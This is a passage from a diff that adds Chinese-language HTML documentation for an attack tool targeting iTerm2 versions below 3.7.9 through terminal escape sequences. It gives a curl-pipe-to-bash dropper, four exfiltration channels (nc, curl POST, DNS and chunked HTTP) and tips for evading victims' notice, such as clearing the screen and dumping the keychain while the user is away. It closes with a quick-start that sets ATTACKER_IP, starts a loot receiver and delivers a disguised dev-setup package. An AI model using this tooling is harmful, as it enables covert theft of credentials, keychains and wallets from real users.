+├── README.b64               1,920 B              → 纯文本邮件
+└── META.txt                                      元数据
+</code></pre>
+<h3 id="63-dropper">6.3 Dropper 结构</h3>
+<pre><code>原始：  curl -s YOUR_IP:8080/s|bash          (22 字节)
+hex：   6375726c202d73...62617368            (44 字符)
+包装：  echo &lt;hex&gt;|xxd -r -p|bash            (64 字符)
+APC：   135 字节                              (远小于 4KB 上限)
+</code></pre>
+<p><strong>为什么用 dropper 而不是内嵌全量脚本</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>方案</th>
+<th>APC 长度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>全量脚本内嵌</td>
+<td>3,895 B</td>
+<td>接近 4KB 上限，易被截断</td>
+</tr>
+<tr>
+<td>dropper</td>
+<td>135 B</td>
+<td>3.2%，留 3,961 字节余量</td>
+</tr>
+</tbody>
+</table>
+<h3 id="64-4">6.4 外带通道（4 条，依次尝试）</h3>
+<pre><code class="language-bash">① nc IP:4444 &lt; bundle.tgz          直连，最快
+② curl -F f=@bundle.tgz http://IP/u    HTTP POST
+③ DNS 外带（&lt; 2MB）                  base64 塞进 DNS 查询
+④ 分段 HTTP（&gt; 2MB）                 split + 逐个上传
+</code></pre>
+<hr />
+<h2 id="_7">七、验证记录</h2>
+<h3 id="71-9">7.1 已完成的验证（9 项）</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>项目</th>
+<th>方法</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>官方二进制 SHA256</td>
+<td>GitHub Actions ubuntu runner</td>
+<td><code>041876a4...</code> / <code>8d7926c2...</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>符号差异</td>
+<td>CI <code>strings</code> 扫描</td>
+<td>3.7.9 有 2 个新符号，3.7.8 全无</td>
+</tr>
+<tr>
+<td>3</td>
+<td>源码级对比</td>
+<td>GitHub raw</td>
+<td>3.7.8 缺 <code>.map { sanitizedResponseMessage($0) }</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>executeAPC 无信任检查</td>
+<td>源码逐行</td>
+<td>3.7.8 和 3.7.9 完全相同</td>
+</tr>
+<tr>
+<td>5</td>
+<td>screenSendReportData 写 PTY</td>
+<td>源码确认</td>
+<td><code>writeLatin1EncodedData:</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>APC 字节结构</td>
+<td>hexdump</td>
+<td><code>0x1b 0x5f 0x47 ... 0x1b 0x5c</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>shell 三行分割</td>
+<td>Git Bash 实测</td>
+<td>Line 2 执行，Line 1/3 报错</td>
+</tr>
+<tr>
+<td>8</td>
+<td>命令真实执行</td>
+<td>Git Bash 实测</td>
+<td>输出 <code>HELLO_FROM_ITERM2</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>完整采集脚本</td>
+<td>Git Bash 实测</td>
+<td>采集到 .gitconfig，打包 217B</td>
+</tr>
+</tbody>
+</table>
+<h3 id="72-ci">7.2 二进制符号对比（CI 实测）</h3>
+<pre><code>符号                                     3.7.8   3.7.9
+────────────────────────────────────────────────────
+it_reportUnsafeControlCharacterSet          0      13   ← 新增
+stringByReplacingControlCharactersWithSpace 0       5   ← 新增
+executeAPC                                  5       5
+respondToTransmit                          20      20
+filenameIsSafe                              4       4
+resourceValues                              4       4
+localizedDescription                       14      14
+screenSendReportData                        5       5
+EBADF                                      14      14
+</code></pre>
+<h3 id="73">7.3 未完成</h3>
+<pre><code>macOS 真机端到端测试
+原因：测试账号未绑定支付方式，GitHub macOS runner 拒绝分配
+替代尝试：Swift on Linux → Linux Foundation 的 localizedDescription
+         是固定字符串，不含路径，无法复现 macOS 行为
+</code></pre>
+<p><strong>但这项被官方修复代码覆盖</strong>：iTerm2 3.7.9 的 sanitizer 存在本身，就是漏洞存在的证明。开发者不会为不存在的问题写补丁。</p>
+<hr />
+<h2 id="_8">八、检测与规避</h2>
+<h3 id="81">8.1 受害者侧的可见痕迹</h3>
+<table>
+<thead>
+<tr>
+<th>痕迹</th>
+<th>是否可见</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cat</code> 输出</td>
+<td>APC 字节不可见，输出正常</td>
+</tr>
+<tr>
+<td>终端报错</td>
+<td>会看到两行 <code>command not found</code></td>
+</tr>
+<tr>
+<td>执行时间</td>
+<td>收集脚本 3-15 秒（取决于文件数）</td>
+</tr>
+<tr>
+<td>网络连接</td>
+<td>有出站连接，但只在执行期间</td>
+</tr>
+<tr>
+<td>磁盘</td>
+<td>临时目录 <code>~/.cache/.d&lt;pid&gt;</code>，执行后删除</td>
+</tr>
+</tbody>
+</table>
+<p><strong>唯一明显的迹象</strong>：终端会闪两行 <code>command not found</code>。如果受害者注意，会发现异常。</p>
+<p><strong>缓解</strong>：在 payload 前面加 <code>clear</code>，或者用 <code>echo</code> 覆盖。</p>
+<h3 id="82">8.2 系统日志</h3>
+<pre><code>· macOS 不记录 shell 命令历史（除非开了 auditd）
+· 网络连接：不影响
+· 文件访问：spotlight 索引可能记录，但不含内容
+· 钥匙串访问：会弹窗（security 命令需要用户授权）
+</code></pre>
+<p><strong>钥匙串访问是最大的风险</strong> —— <code>security dump-keychain</code> 会弹窗要求密码。建议跳过或者只在用户离开时执行。</p>
+<h3 id="83">8.3 改进建议</h3>
+<pre><code>· 检查屏幕锁定状态，锁定时执行
+· 钥匙串 dump 放在最后，如果前面已经拿到足够数据就跳过
+· 用 nohup 后台执行，避免阻塞终端
+· 执行后 clear 屏幕
+</code></pre>
+<hr />
+<h2 id="_9">九、局限</h2>
+<h3 id="91">9.1 技术局限</h3>
+<table>
+<thead>
+<tr>
+<th>局限</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>APC &lt; 4KB</td>
+<td>所以用 dropper</td>
+</tr>
+<tr>
+<td>命令不能含 <code>/</code> 和 <code>"</code></td>
+<td>所以用 hex 包装</td>
+</tr>
+<tr>
+<td>tmux 模式下不触发</td>
+<td>目标用 tmux 则失效</td>
+</tr>
+<tr>
+<td>只对 iTerm2 有效</td>
+<td>Terminal.app 无效</td>
+</tr>
+<tr>
+<td>3.7.9+ 已修复</td>
+<td>版本必须低于 3.7.9</td>
+</tr>
+</tbody>
+</table>
+<h3 id="92">9.2 环境局限</h3>
+<table>
+<thead>
+<tr>
+<th>局限</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>钥匙串可能需要交互</td>
+<td>用户在场时可能失败</td>
+</tr>
+<tr>
+<td>钱包 vault 加密</td>
+<td>需要密码才能解密</td>
+</tr>
+<tr>
+<td>密码管理器加密</td>
+<td>需要主密码</td>
+</tr>
+<tr>
+<td>部分文件访问需要 FDA 权限</td>
+<td>未授权时文件读不到</td>
+</tr>
+</tbody>
+</table>
+<h3 id="93">9.3 法律与合规</h3>
+<p><strong>这是攻击工具的说明文档。使用前必须确认：</strong></p>
+<pre><code>· 目标系统的所有者书面授权
+· 或属于自己控制的测试环境
+· 符合所在司法辖区的法律
+· 有明确的测试范围和边界
+</code></pre>
+<hr />
+<h2 id="_10">十、文件清单</h2>
+<pre><code>redteam/recon/
+├── payload-full.sh           收集脚本（22 模块，535 行）
+├── delivery.py               投递包生成器（3 形态 + CRLF 检测）
+├── server.py                 接收端（nc + HTTP）
+├── build.py                  exploit 生成器（三模式）
+├── simulate_victim.py        端到端模拟器（Git Bash 实测）
+├── bin-diff.py               二进制符号对比
+├── crlf-test.py              传输破坏测试
+├── dropper-test.py           dropper 长度测试
+├── ITERM2-VERIFICATION.md    验证报告
+├── iterm2-poc.html/txt       PoC 原文存档
+├── dist/                     已生成的各种 payload
+└── delivery/                 已生成的投递包
+</code></pre>
+<hr />
+<h2 id="_11">十一、快速开始</h2>
+<pre><code class="language-bash"># 1. 改 IP
+export ATTACKER_IP=1.2.3.4
+export ATTACKER_PORT=4444
+export HTTP_PORT=8080
+
+# 2. 准备 dropper
+cp payload-full.sh s
+sed -i &quot;s/ATTACKER_IP/${ATTACKER_IP}/g; s/ATTACKER_PORT/${ATTACKER_PORT}/g&quot; s
+
+# 3. 启动 HTTP
+python -m http.server ${HTTP_PORT} &amp;
+
+# 4. 启动接收
+python server.py --port ${ATTACKER_PORT} --http-port 8081 --out ./loot &amp;
+
+# 5. 生成投递包
+python delivery.py --ip ${ATTACKER_IP} --port ${HTTP_PORT} \
+  --nc-port ${ATTACKER_PORT} --mode dropper --all --out ./delivery
+
+# 6. 投递 ./delivery/dev-setup-setup.zip 或 ./delivery/README.md
+
+# 7. 收数据
+ls -la ./loot/
+</code></pre>
+</body>
+</html>
